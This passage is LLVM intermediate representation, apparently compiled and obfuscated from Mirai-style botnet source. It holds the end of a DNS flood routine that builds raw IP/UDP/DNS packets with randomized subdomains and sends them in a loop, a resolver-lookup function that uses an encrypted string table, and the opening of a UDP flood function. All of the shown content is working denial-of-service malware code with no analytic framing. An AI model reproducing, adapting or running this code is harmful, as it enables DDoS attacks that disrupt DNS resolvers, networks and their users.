  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8*, i8** %114, i64 %116
  store i8* %113, i8** %117, align 8
  %118 = load i8**, i8*** %13, align 8
  %119 = load i32, i32* %11, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to %struct.iphdr*
  store %struct.iphdr* %123, %struct.iphdr** %29, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i64 1
  %126 = bitcast %struct.iphdr* %125 to %struct.udphdr*
  store %struct.udphdr* %126, %struct.udphdr** %30, align 8
  %127 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i64 1
  %129 = bitcast %struct.udphdr* %128 to %struct.dnshdr*
  store %struct.dnshdr* %129, %struct.dnshdr** %31, align 8
  %130 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %131 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %130, i64 1
  %132 = bitcast %struct.dnshdr* %131 to i8*
  store i8* %132, i8** %32, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = xor i8 15, -1
  %137 = xor i8 %135, %136
  %138 = and i8 %137, %135
  %139 = and i8 %135, 15
  %140 = and i8 %138, 64
  %141 = xor i8 %138, 64
  %142 = or i8 %140, %141
  %143 = or i8 %138, 64
  store i8 %142, i8* %134, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = xor i8 -16, -1
  %148 = xor i8 %146, %147
  %149 = and i8 %148, %146
  %150 = and i8 %146, -16
  %151 = and i8 %149, 5
  %152 = xor i8 %149, 5
  %153 = or i8 %151, %152
  %154 = or i8 %149, 5
  store i8 %153, i8* %145, align 4
  %155 = load i8, i8* %14, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 1
  store i8 %155, i8* %157, align 1
  %158 = load i8, i8* %21, align 1
  %159 = zext i8 %158 to i64
  %160 = sub i64 0, %159
  %161 = sub i64 41, %160
  %162 = add i64 41, %159
  %163 = sub i64 0, 2
  %164 = sub i64 %161, %163
  %165 = add i64 %161, 2
  %166 = load i32, i32* %23, align 4
  %167 = sext i32 %166 to i64
  %168 = sub i64 0, %167
  %169 = sub i64 %164, %168
  %170 = add i64 %164, %167
  %171 = sub i64 0, %169
  %172 = sub i64 0, 4
  %173 = add i64 %171, %172
  %174 = sub i64 0, %173
  %175 = add i64 %169, 4
  %176 = trunc i64 %174 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  %180 = load i16, i16* %15, align 2
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 3
  store i16 %181, i16* %183, align 4
  %184 = load i8, i8* %16, align 1
  %185 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 5
  store i8 %184, i8* %186, align 4
  %187 = load i8, i8* %17, align 1
  %188 = icmp ne i8 %187, 0
  br i1 %188, label %189, label %193

; <label>:189:                                    ; preds = %112
  %190 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 4
  store i16 %190, i16* %192, align 2
  br label %193

; <label>:193:                                    ; preds = %189, %112
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 6
  store i8 17, i8* %195, align 1
  %196 = load i32, i32* @LOCAL_ADDR, align 4
  %197 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 8
  store i32 %196, i32* %198, align 4
  %199 = load i32, i32* %24, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 9
  store i32 %199, i32* %201, align 4
  %202 = load i16, i16* %18, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 2
  %206 = load i16, i16* %19, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %209 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %208, i32 0, i32 1
  store i16 %207, i16* %209, align 2
  %210 = load i8, i8* %21, align 1
  %211 = zext i8 %210 to i64
  %212 = sub i64 21, 9199216285314908678
  %213 = add i64 %212, %211
  %214 = add i64 %213, 9199216285314908678
  %215 = add i64 21, %211
  %216 = sub i64 %214, -366848654356058330
  %217 = add i64 %216, 2
  %218 = add i64 %217, -366848654356058330
  %219 = add i64 %214, 2
  %220 = load i32, i32* %23, align 4
  %221 = sext i32 %220 to i64
  %222 = sub i64 0, %218
  %223 = sub i64 0, %221
  %224 = add i64 %222, %223
  %225 = sub i64 0, %224
  %226 = add i64 %218, %221
  %227 = sub i64 0, 4
  %228 = sub i64 %225, %227
  %229 = add i64 %225, 4
  %230 = trunc i64 %228 to i16
  %231 = call zeroext i16 @htons(i16 zeroext %230) #7
  %232 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %233 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %232, i32 0, i32 2
  store i16 %231, i16* %233, align 2
  %234 = load i16, i16* %20, align 2
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %237 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %236, i32 0, i32 0
  store i16 %235, i16* %237, align 2
  %238 = call zeroext i16 @htons(i16 zeroext 256) #7
  %239 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %240 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %239, i32 0, i32 1
  store i16 %238, i16* %240, align 2
  %241 = call zeroext i16 @htons(i16 zeroext 1) #7
  %242 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %243 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  %244 = load i8, i8* %21, align 1
  %245 = load i8*, i8** %32, align 8
  %246 = getelementptr inbounds i8, i8* %245, i32 1
  store i8* %246, i8** %32, align 8
  store i8 %244, i8* %245, align 1
  %247 = load i8, i8* %21, align 1
  %248 = zext i8 %247 to i32
  %249 = load i8*, i8** %32, align 8
  %250 = sext i32 %248 to i64
  %251 = getelementptr inbounds i8, i8* %249, i64 %250
  store i8* %251, i8** %32, align 8
  %252 = load i8*, i8** %32, align 8
  store i8* %252, i8** %33, align 8
  %253 = load i8*, i8** %32, align 8
  %254 = getelementptr inbounds i8, i8* %253, i64 1
  %255 = load i8*, i8** %22, align 8
  %256 = load i32, i32* %23, align 4
  %257 = sub i32 0, 1
  %258 = sub i32 %256, %257
  %259 = add nsw i32 %256, 1
  call void @util_memcpy(i8* %254, i8* %255, i32 %258)
  store i32 0, i32* %26, align 4
  br label %260

; <label>:260:                                    ; preds = %291, %193
  %261 = load i32, i32* %26, align 4
  %262 = load i32, i32* %23, align 4
  %263 = icmp slt i32 %261, %262
  br i1 %263, label %264, label %298

; <label>:264:                                    ; preds = %260
  %265 = load i8*, i8** %22, align 8
  %266 = load i32, i32* %26, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds i8, i8* %265, i64 %267
  %269 = load i8, i8* %268, align 1
  %270 = sext i8 %269 to i32
  %271 = icmp eq i32 %270, 46
  br i1 %271, label %272, label %284

; <label>:272:                                    ; preds = %264
  %273 = load i8, i8* %27, align 1
  %274 = load i8*, i8** %33, align 8
  store i8 %273, i8* %274, align 1
  store i8 0, i8* %27, align 1
  %275 = load i8, i8* %28, align 1
  %276 = sub i8 0, 1
  %277 = sub i8 %275, %276
  %278 = add i8 %275, 1
  store i8 %277, i8* %28, align 1
  %279 = load i8*, i8** %32, align 8
  %280 = load i32, i32* %26, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds i8, i8* %279, i64 %281
  %283 = getelementptr inbounds i8, i8* %282, i64 1
  store i8* %283, i8** %33, align 8
  br label %290

; <label>:284:                                    ; preds = %264
  %285 = load i8, i8* %27, align 1
  %286 = sub i8 %285, 102
  %287 = add i8 %286, 1
  %288 = add i8 %287, 102
  %289 = add i8 %285, 1
  store i8 %288, i8* %27, align 1
  br label %290

; <label>:290:                                    ; preds = %284, %272
  br label %291

; <label>:291:                                    ; preds = %290
  %292 = load i32, i32* %26, align 4
  %293 = sub i32 0, %292
  %294 = sub i32 0, 1
  %295 = add i32 %293, %294
  %296 = sub i32 0, %295
  %297 = add nsw i32 %292, 1
  store i32 %296, i32* %26, align 4
  br label %260

; <label>:298:                                    ; preds = %260
  %299 = load i8, i8* %27, align 1
  %300 = load i8*, i8** %33, align 8
  store i8 %299, i8* %300, align 1
  %301 = load i8*, i8** %32, align 8
  %302 = load i32, i32* %23, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8, i8* %301, i64 %303
  %305 = getelementptr inbounds i8, i8* %304, i64 2
  %306 = bitcast i8* %305 to %struct.grehdr*
  store %struct.grehdr* %306, %struct.grehdr** %34, align 8
  %307 = call zeroext i16 @htons(i16 zeroext 1) #7
  %308 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %309 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %308, i32 0, i32 0
  store i16 %307, i16* %309, align 2
  %310 = call zeroext i16 @htons(i16 zeroext 1) #7
  %311 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %312 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %311, i32 0, i32 1
  store i16 %310, i16* %312, align 2
  br label %313

; <label>:313:                                    ; preds = %298
  %314 = load i32, i32* %11, align 4
  %315 = sub i32 0, %314
  %316 = sub i32 0, 1
  %317 = add i32 %315, %316
  %318 = sub i32 0, %317
  %319 = add nsw i32 %314, 1
  store i32 %318, i32* %11, align 4
  br label %107

; <label>:320:                                    ; preds = %107
  br label %321

; <label>:321:                                    ; preds = %518, %320
  store i32 0, i32* %11, align 4
  br label %322

; <label>:322:                                    ; preds = %505, %321
  %323 = load i32, i32* %11, align 4
  %324 = load i8, i8* %7, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %323, %325
  br i1 %326, label %327, label %512

; <label>:327:                                    ; preds = %322
  %328 = load i8**, i8*** %13, align 8
  %329 = load i32, i32* %11, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8*, i8** %328, i64 %330
  %332 = load i8*, i8** %331, align 8
  store i8* %332, i8** %35, align 8
  %333 = load i8*, i8** %35, align 8
  %334 = bitcast i8* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %36, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.udphdr*
  store %struct.udphdr* %337, %struct.udphdr** %37, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i64 1
  %340 = bitcast %struct.udphdr* %339 to %struct.dnshdr*
  store %struct.dnshdr* %340, %struct.dnshdr** %38, align 8
  %341 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %342 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %341, i64 1
  %343 = bitcast %struct.dnshdr* %342 to i8*
  %344 = getelementptr inbounds i8, i8* %343, i64 1
  store i8* %344, i8** %39, align 8
  %345 = load i16, i16* %15, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  br i1 %347, label %348, label %357

; <label>:348:                                    ; preds = %327
  %349 = call i32 @rand_next()
  %350 = xor i32 65535, -1
  %351 = xor i32 %349, %350
  %352 = and i32 %351, %349
  %353 = and i32 %349, 65535
  %354 = trunc i32 %352 to i16
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 3
  store i16 %354, i16* %356, align 4
  br label %357

; <label>:357:                                    ; preds = %348, %327
  %358 = load i16, i16* %18, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %374

; <label>:361:                                    ; preds = %357
  %362 = call i32 @rand_next()
  %363 = xor i32 %362, -1
  %364 = xor i32 65535, -1
  %365 = xor i32 -217933680, -1
  %366 = or i32 %363, %364
  %367 = or i32 -217933680, %365
  %368 = xor i32 %366, -1
  %369 = and i32 %368, %367
  %370 = and i32 %362, 65535
  %371 = trunc i32 %369 to i16
  %372 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %373 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %372, i32 0, i32 0
  store i16 %371, i16* %373, align 2
  br label %374

; <label>:374:                                    ; preds = %361, %357
  %375 = load i16, i16* %19, align 2
  %376 = zext i16 %375 to i32
  %377 = icmp eq i32 %376, 65535
  br i1 %377, label %378, label %391

; <label>:378:                                    ; preds = %374
  %379 = call i32 @rand_next()
  %380 = xor i32 %379, -1
  %381 = xor i32 65535, -1
  %382 = xor i32 529127763, -1
  %383 = or i32 %380, %381
  %384 = or i32 529127763, %382
  %385 = xor i32 %383, -1
  %386 = and i32 %385, %384
  %387 = and i32 %379, 65535
  %388 = trunc i32 %386 to i16
  %389 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 1
  store i16 %388, i16* %390, align 2
  br label %391

; <label>:391:                                    ; preds = %378, %374
  %392 = load i16, i16* %20, align 2
  %393 = zext i16 %392 to i32
  %394 = icmp eq i32 %393, 65535
  br i1 %394, label %395, label %408

; <label>:395:                                    ; preds = %391
  %396 = call i32 @rand_next()
  %397 = xor i32 %396, -1
  %398 = xor i32 65535, -1
  %399 = xor i32 -1283559976, -1
  %400 = or i32 %397, %398
  %401 = or i32 -1283559976, %399
  %402 = xor i32 %400, -1
  %403 = and i32 %402, %401
  %404 = and i32 %396, 65535
  %405 = trunc i32 %403 to i16
  %406 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %407 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %406, i32 0, i32 0
  store i16 %405, i16* %407, align 2
  br label %408

; <label>:408:                                    ; preds = %395, %391
  %409 = load i8*, i8** %39, align 8
  %410 = load i8, i8* %21, align 1
  %411 = zext i8 %410 to i32
  call void @rand_alpha_str(i8* %409, i32 %411)
  %412 = load i8*, i8** %39, align 8
  %413 = load i8, i8* %21, align 1
  %414 = zext i8 %413 to i64
  %415 = getelementptr inbounds i8, i8* %412, i64 %414
  store i8 0, i8* %415, align 1
  %416 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 7
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %419 = bitcast %struct.iphdr* %418 to i16*
  %420 = call zeroext i16 @checksum_generic(i16* %419, i32 20)
  %421 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 %420, i16* %422, align 2
  %423 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %424 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %423, i32 0, i32 3
  store i16 0, i16* %424, align 2
  %425 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %426 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %427 = bitcast %struct.udphdr* %426 to i8*
  %428 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 2
  %430 = load i16, i16* %429, align 2
  %431 = load i8, i8* %21, align 1
  %432 = zext i8 %431 to i64
  %433 = sub i64 21, -5475379412052685153
  %434 = add i64 %433, %432
  %435 = add i64 %434, -5475379412052685153
  %436 = add i64 21, %432
  %437 = sub i64 0, 2
  %438 = sub i64 %435, %437
  %439 = add i64 %435, 2
  %440 = load i32, i32* %23, align 4
  %441 = sext i32 %440 to i64
  %442 = add i64 %438, 7569055553853060370
  %443 = add i64 %442, %441
  %444 = sub i64 %443, 7569055553853060370
  %445 = add i64 %438, %441
  %446 = sub i64 0, %444
  %447 = sub i64 0, 4
  %448 = add i64 %446, %447
  %449 = sub i64 0, %448
  %450 = add i64 %444, 4
  %451 = trunc i64 %449 to i32
  %452 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %425, i8* %427, i16 zeroext %430, i32 %451)
  %453 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %454 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %453, i32 0, i32 3
  store i16 %452, i16* %454, align 2
  %455 = load i32, i32* %24, align 4
  %456 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %457 = load i32, i32* %11, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i32 0, i32 0
  %461 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %460, i32 0, i32 2
  %462 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %461, i32 0, i32 0
  store i32 %455, i32* %462, align 4
  %463 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %464 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %463, i32 0, i32 1
  %465 = load i16, i16* %464, align 2
  %466 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %467 = load i32, i32* %11, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %466, i64 %468
  %470 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i32 0, i32 0
  %471 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %470, i32 0, i32 1
  store i16 %465, i16* %471, align 2
  %472 = load i32, i32* %12, align 4
  %473 = load i8*, i8** %35, align 8
  %474 = load i8, i8* %21, align 1
  %475 = zext i8 %474 to i64
  %476 = sub i64 41, 1138181351060366210
  %477 = add i64 %476, %475
  %478 = add i64 %477, 1138181351060366210
  %479 = add i64 41, %475
  %480 = sub i64 0, %478
  %481 = sub i64 0, 2
  %482 = add i64 %480, %481
  %483 = sub i64 0, %482
  %484 = add i64 %478, 2
  %485 = load i32, i32* %23, align 4
  %486 = sext i32 %485 to i64
  %487 = sub i64 0, %486
  %488 = sub i64 %483, %487
  %489 = add i64 %483, %486
  %490 = sub i64 0, %488
  %491 = sub i64 0, 4
  %492 = add i64 %490, %491
  %493 = sub i64 0, %492
  %494 = add i64 %488, 4
  %495 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %496 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %497 = load i32, i32* %11, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i32 0, i32 0
  %501 = bitcast %struct.sockaddr_in* %500 to %struct.sockaddr*
  store %struct.sockaddr* %501, %struct.sockaddr** %495, align 8
  %502 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %503 = load %struct.sockaddr*, %struct.sockaddr** %502, align 8
  %504 = call i64 @sendto(i32 %472, i8* %473, i64 %493, i32 16384, %struct.sockaddr* %503, i32 16)
  br label %505

; <label>:505:                                    ; preds = %408
  %506 = load i32, i32* %11, align 4
  %507 = sub i32 0, %506
  %508 = sub i32 0, 1
  %509 = add i32 %507, %508
  %510 = sub i32 0, %509
  %511 = add nsw i32 %506, 1
  store i32 %510, i32* %11, align 4
  br label %322

; <label>:512:                                    ; preds = %322
  %513 = call i64 @time(i64* null) #6
  %514 = load i32, i32* %25, align 4
  %515 = sext i32 %514 to i64
  %516 = icmp sgt i64 %513, %515
  br i1 %516, label %517, label %518

; <label>:517:                                    ; preds = %512
  br label %519

; <label>:518:                                    ; preds = %512
  br label %321

; <label>:519:                                    ; preds = %517, %103, %97, %91
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 41)
  %11 = call i8* @table_retrieve_val(i32 41, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 41)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 42)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 42, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 42)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %105

; <label>:28:                                     ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %93, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %98

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %93

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %72, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = add i32 %66, 1613786087
  %68 = sub i32 %67, 1
  %69 = sub i32 %68, 1613786087
  %70 = sub nsw i32 %66, 1
  %71 = icmp eq i32 %65, %69
  br i1 %71, label %72, label %92

; <label>:72:                                     ; preds = %64, %60, %56
  %73 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, -428889810
  %81 = sub i32 %80, %79
  %82 = add i32 %81, -428889810
  %83 = sub nsw i32 %78, %79
  call void @util_memcpy(i8* %73, i8* %77, i32 %82)
  %84 = load i32, i32* %6, align 4
  %85 = load i32, i32* %4, align 4
  %86 = sub i32 %84, -954332662
  %87 = sub i32 %86, %85
  %88 = add i32 %87, -954332662
  %89 = sub nsw i32 %84, %85
  %90 = sext i32 %88 to i64
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %90
  store i8 0, i8* %91, align 1
  store i8 1, i8* %9, align 1
  br label %98

; <label>:92:                                     ; preds = %64
  br label %93

; <label>:93:                                     ; preds = %92, %49
  %94 = load i32, i32* %6, align 4
  %95 = sub i32 0, 1
  %96 = sub i32 %94, %95
  %97 = add nsw i32 %94, 1
  store i32 %96, i32* %6, align 4
  br label %30

; <label>:98:                                     ; preds = %72, %30
  %99 = load i8, i8* %9, align 1
  %100 = icmp ne i8 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  br label %117

; <label>:104:                                    ; preds = %98
  br label %105

; <label>:105:                                    ; preds = %104, %15
  br label %106

; <label>:106:                                    ; preds = %105, %0
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  switch i32 %108, label %117 [
    i32 0, label %109
    i32 1, label %111
    i32 2, label %113
    i32 3, label %115
  ]

; <label>:109:                                    ; preds = %106
  %110 = call i32 @htonl(i32 134744072) #7
  store i32 %110, i32* %1, align 4
  br label %117

; <label>:111:                                    ; preds = %106
  %112 = call i32 @htonl(i32 1246898730) #7
  store i32 %112, i32* %1, align 4
  br label %117

; <label>:113:                                    ; preds = %106
  %114 = call i32 @htonl(i32 1074151430) #7
  store i32 %114, i32* %1, align 4
  br label %117

; <label>:115:                                    ; preds = %106
  %116 = call i32 @htonl(i32 67240450) #7
  store i32 %116, i32* %1, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %113, %111, %109, %106, %101
  %118 = load i32, i32* %1, align 4
  ret i32 %118
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
